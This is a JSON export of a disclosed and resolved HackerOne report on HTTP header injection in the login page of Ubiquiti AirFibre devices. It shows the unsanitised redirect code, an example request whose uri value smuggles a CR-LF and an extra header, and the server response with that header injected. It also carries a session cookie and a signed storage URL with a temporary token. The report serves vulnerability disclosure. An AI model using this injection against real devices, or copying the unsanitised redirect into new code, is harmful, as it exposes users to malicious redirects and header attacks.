{"id":203673,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDM2NzM=","url":"https://hackerone.com/reports/203673","title":"AirFibre products vulnerable to HTTP Header injection","state":"Closed","substate":"resolved","severity_rating":"none","readable_substate":"Resolved","created_at":"2017-02-05T21:32:19.196Z","submitted_at":"2017-02-05T21:32:19.196Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"simongurney","url":"/simongurney","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":800,"url":"https://hackerone.com/ui","handle":"ui","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/800/449ca06f77c3e1dd1979bae1e5f16150334f7479_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/800/449ca06f77c3e1dd1979bae1e5f16150334f7479_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Ubiquiti Inc.","twitter_handle":"ubnt","website":"https://ui.com","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-05-17T17:01:21.732Z","bug_reporter_agreed_on_going_public_at":"2017-04-17T17:01:13.730Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The uri GET parameter of Login.cgi is directly used (on login) to generate HTTP headers without sanitisation.  An user could be tricked into logging into the device and then redirected to a malicious location or attacked through other HTTP Header injection attacks.\n\nVulnerable code:\nif (isset($uri) \u0026\u0026 strlen($uri) \u003e 0) {\nHeader(\"Location: \" + urldecode($uri));\nexit;\n\n----------------------\nExample POST\nPOST https://10.62.148.4/login.cgi HTTP/1.1\nConnection: keep-alive\nContent-Length: 363\nCache-Control: max-age=0\nOrigin: https://10.62.148.4\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarynT8O7Wj9TOBD7eKm\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nReferer: https://10.62.148.4/login.cgi?uri=/admin.cgi%0d%0aNewHeader:Value\nAccept-Encoding: br\nAccept-Language: en-US,en;q=0.8\nCookie: last_check=1486326659118; AIROS_SESSIONID=a89e9d80a7a7aa87e305f8638458e582; ui_language=en_US\nHost: 10.62.148.4\n\n------WebKitFormBoundarynT8O7Wj9TOBD7eKm\nContent-Disposition: form-data; name=\"uri\"\n\n/admin.cgi\nNewHeader:Value\n.....SNIPPED.....\n\nExample response:\n\nHTTP/1.1 302 Found\nLocation: /admin.cgi\nNewHeader: Value\nSet-cookie: ui_language=en_US; expires=Tuesday, 19-Jan-38 03:14:07 GMT\nContent-Type: text/html\nDate: Sun, 05 Feb 2017 21:08:27 GMT\nServer: lighttpd/1.4.30\n\n","vulnerability_information_html":"\u003cp\u003eThe uri GET parameter of Login.cgi is directly used (on login) to generate HTTP headers without sanitisation.  An user could be tricked into logging into the device and then redirected to a malicious location or attacked through other HTTP Header injection attacks.\u003c/p\u003e\n\n\u003cp\u003eVulnerable code:\u003cbr\u003e\nif (isset($uri) \u0026amp;\u0026amp; strlen($uri) \u0026gt; 0) {\u003cbr\u003e\nHeader(\u0026quot;Location: \u0026quot; + urldecode($uri));\u003cbr\u003e\nexit;\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eExample POST\u003cbr\u003e\nPOST \u003ca title=\"https://10.62.148.4/login.cgi\" href=\"/redirect?url=https%3A%2F%2F10.62.148.4%2Flogin.cgi\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://10.62.148.4/login.cgi\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e HTTP/1.1\u003cbr\u003e\nConnection: keep-alive\u003cbr\u003e\nContent-Length: 363\u003cbr\u003e\nCache-Control: max-age=0\u003cbr\u003e\nOrigin: \u003ca title=\"https://10.62.148.4\" href=\"/redirect?url=https%3A%2F%2F10.62.148.4\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://10.62.148.4\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nUpgrade-Insecure-Requests: 1\u003cbr\u003e\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\u003cbr\u003e\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarynT8O7Wj9TOBD7eKm\u003cbr\u003e\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\u003cem\u003e/\u003c/em\u003e;q=0.8\u003cbr\u003e\nReferer: \u003ca title=\"https://10.62.148.4/login.cgi?uri=/admin.cgi%0d%0aNewHeader:Value\" href=\"/redirect?url=https%3A%2F%2F10.62.148.4%2Flogin.cgi%3Furi%3D%2Fadmin.cgi%250d%250aNewHeader%3AValue\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://10.62.148.4/login.cgi?uri=/admin.cgi%0d%0aNewHeader:Value\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nAccept-Encoding: br\u003cbr\u003e\nAccept-Language: en-US,en;q=0.8\u003cbr\u003e\nCookie: last_check=1486326659118; AIROS_SESSIONID=a89e9d80a7a7aa87e305f8638458e582; ui_language=en_US\u003cbr\u003e\nHost: 10.62.148.4\u003c/p\u003e\n\n\u003cp\u003e------WebKitFormBoundarynT8O7Wj9TOBD7eKm\u003cbr\u003e\nContent-Disposition: form-data; name=\u0026quot;uri\u0026quot;\u003c/p\u003e\n\n\u003cp\u003e/admin.cgi\u003cbr\u003e\nNewHeader:Value\u003cbr\u003e\n.....SNIPPED.....\u003c/p\u003e\n\n\u003cp\u003eExample response:\u003c/p\u003e\n\n\u003cp\u003eHTTP/1.1 302 Found\u003cbr\u003e\nLocation: /admin.cgi\u003cbr\u003e\nNewHeader: Value\u003cbr\u003e\nSet-cookie: ui_language=en_US; expires=Tuesday, 19-Jan-38 03:14:07 GMT\u003cbr\u003e\nContent-Type: text/html\u003cbr\u003e\nDate: Sun, 05 Feb 2017 21:08:27 GMT\u003cbr\u003e\nServer: lighttpd/1.4.30\u003c/p\u003e\n","bounty_amount":"150.0","formatted_bounty":"$150","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":157623,"file_name":"Untitled.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/157/623/950ad3598d7ca43aa5ff24323629eb1cc9c28b31/Untitled.png?response-content-disposition=attachment%3B%20filename%3D%22Untitled.png%22%3B%20filename%2A%3DUTF-8%27%27Untitled.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZT5T356C%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045432Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBcsqzm4YMyykC8pKAfuq22D6bSOUdyHaa8fIa4mUQhAAiEAiwPORMjouAw3a3uzUTZC%2BINQcpZp97MOQsVELFW4zLYqtAMIUBABGgwwMTM2MTkyNzQ4NDkiDKDiVMmiMU9V%2FMrmWyqRA4sIGIrOpHyvVZfmW2jMtAM8T%2B3ge7R5BW4DZ%2F780qW3KhtUb%2BlN4eJRg5WRaAT1yVb84a%2FkYNxsJD%2FuSvAe1wqOnVhU6s2QkIgwao%2BmXWZI5Gv75IeDf5AKwwqIEXhO%2BTfJ7qch1s5pk6yRn5dlzyaRdvpwfit2B%2BnXtVL4Ks0Z%2BsF2L1Sb9lQIKC%2FyiIIKOMM1XnEe09NuSw7Xf8Y6UOJpBJj7jLlVUmTMlaXhg0X5owu1jllReuJ1Ofketv8kjZlScgELVQhqeic8VvMdQFPk7uIxbwdUxI2D8U0mLOURF82HqwOSOvz3AjdFiUL5rInys31EjL5eLGhJJbviiWW1U6yAdtVgX5Dl9fG5sndUapgZ6tOzi5c%2FKiIqcs6TFB7V%2Ba94pbfE0ADF3Y25zJTundlOhWYZvSXJ2UVXh75JBOJYxsTgwZ5UgbsU6QjjUdK4ipM4ELoinryh%2FjoKyVb8ZjECBbMYtE22GC3vCLw7DmthiFcvoOPlRvKlah04sJNQ7b9KklIYWOG8BUX0xWhiMIC6qf8FOusB8i%2B4NEipXflNQqWCERI653SNHefieJr6qXk8vUjlyfvLnR2tXIQ%2FWyHufZZf0Rg4hKv79dttIkGWWsjFWimwSTHN9mTNskp6X9ZC4gvqOEnXuOZx%2Bxs2%2BUbYrNxuALH8x%2F%2FpM%2Fh0c4yBQF6OpSWOrWsdl5H%2BUIYyT8bSyRmCqToj58jXSS6GdhErBYuWCR9lbvOawRSwbxWyEGwvrNZPVRFC6gFj0nD1QwcZcdcCocD0zhQwtFu6F4LHGlpDLS8voy4%2BpFMo9RuKO1foe47wef9OHTulwBbLQCigHgaQeH2Lh7CupMWFI4rneA%3D%3D\u0026X-Amz-Signature=55f677755fa3ef72faaac13dcce59da1422ff12b1b158b27b66a6aca2cd5f748","file_size":10123,"type":"image/png"}],"allow_singular_disclosure_at":"2017-05-17T17:01:13.770Z","allow_singular_disclosure_after":-114177199.0884387,"singular_disclosure_allowed":true,"vote_count":2,"voters":["eveeez","spetr0x"],"severity":{"rating":"none","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1464647,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-06T10:31:32.533Z","updated_at":"2017-02-06T10:31:32.533Z","actor":{"username":"ubnt-rubens","cleared":false,"url":"/ubnt-rubens","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1549442,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, any update?","markdown_message":"\u003cp\u003eHi, any update?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-18T10:40:17.823Z","updated_at":"2017-03-18T10:40:17.823Z","actor":{"username":"simongurney","cleared":false,"url":"/simongurney","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1603366,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any update?  To clarify this issue is in the login.cgi page with the code below:\n\n\t\t\tif (isset($uri) \u0026\u0026 strlen($uri) \u003e 0) {\n\t\t\t\tHeader(\"Location: \" + urldecode($uri));\n\t\t\t\texit;\n\t\t\t} else {\n\t\t\t\tHeader(\"Location: /index.cgi\");\n\t\t\t\texit;\n\t\t\t}","markdown_message":"\u003cp\u003eAny update?  To clarify this issue is in the login.cgi page with the code below:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e        if (isset($uri) \u0026amp;\u0026amp; strlen($uri) \u0026gt; 0) {\n            Header(\u0026quot;Location: \u0026quot; + urldecode($uri));\n            exit;\n        } else {\n            Header(\u0026quot;Location: /index.cgi\u0026quot;);\n            exit;\n        }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2017-04-10T19:47:44.004Z","updated_at":"2017-04-10T19:47:44.004Z","actor":{"username":"simongurney","cleared":false,"url":"/simongurney","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1604534,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @simongurney,\n\nCould you please verify the fix in the latest firmware?\n\nThanks","markdown_message":"\u003cp\u003eHi \u003ca href=\"/simongurney\"\u003e@simongurney\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eCould you please verify the fix in the latest firmware?\u003c/p\u003e\n\n\u003cp\u003eThanks\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-11T11:41:40.220Z","updated_at":"2017-04-11T11:41:40.220Z","actor":{"username":"ubnt-rubens","cleared":false,"url":"/ubnt-rubens","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1605349,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nInitially I thought it hadn't but it appears that the urldecode functions does now strip return carriages and mitigates the threat.  This issue I raised has been fixed in 3.2.3 with the modifications made to urldecode function.\n\nFor info I tested this with OWASP ZAP with the same method I used to find the bug.","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eInitially I thought it hadn\u0026#39;t but it appears that the urldecode functions does now strip return carriages and mitigates the threat.  This issue I raised has been fixed in 3.2.3 with the modifications made to urldecode function.\u003c/p\u003e\n\n\u003cp\u003eFor info I tested this with OWASP ZAP with the same method I used to find the bug.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-11T17:48:29.088Z","updated_at":"2017-04-11T17:48:29.088Z","actor":{"username":"simongurney","cleared":false,"url":"/simongurney","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1607078,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-04-12T13:27:14.020Z","updated_at":"2017-04-12T13:27:14.020Z","actor":{"url":"/ui","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/800/449ca06f77c3e1dd1979bae1e5f16150334f7479_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ubiquiti Inc."}},"bounty_amount":"150.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"ui","collaborator":{"username":"simongurney","url":"/simongurney"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1607079,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you and good luck with future bug hunting.","markdown_message":"\u003cp\u003eThank you and good luck with future bug hunting.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-12T13:27:28.745Z","updated_at":"2017-04-12T13:27:28.745Z","actor":{"username":"ubnt-rubens","cleared":false,"url":"/ubnt-rubens","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"simongurney","url":"/simongurney"},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1615830,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-04-17T17:01:13.750Z","updated_at":"2017-04-17T17:01:13.750Z","first_to_agree":true,"actor":{"username":"simongurney","cleared":false,"url":"/simongurney","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1667490,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Rubens,\n\nI have quite a few bugs closed now for AirFibre and NanoStation products, any chance of some swag?","markdown_message":"\u003cp\u003eHi Rubens,\u003c/p\u003e\n\n\u003cp\u003eI have quite a few bugs closed now for AirFibre and NanoStation products, any chance of some swag?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-11T07:39:56.784Z","updated_at":"2017-05-11T07:39:56.784Z","actor":{"username":"simongurney","cleared":false,"url":"/simongurney","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1681160,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-17T17:01:21.749Z","updated_at":"2017-05-17T17:01:21.749Z","actor":{"url":"/ui","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/800/449ca06f77c3e1dd1979bae1e5f16150334f7479_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ubiquiti Inc."}},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}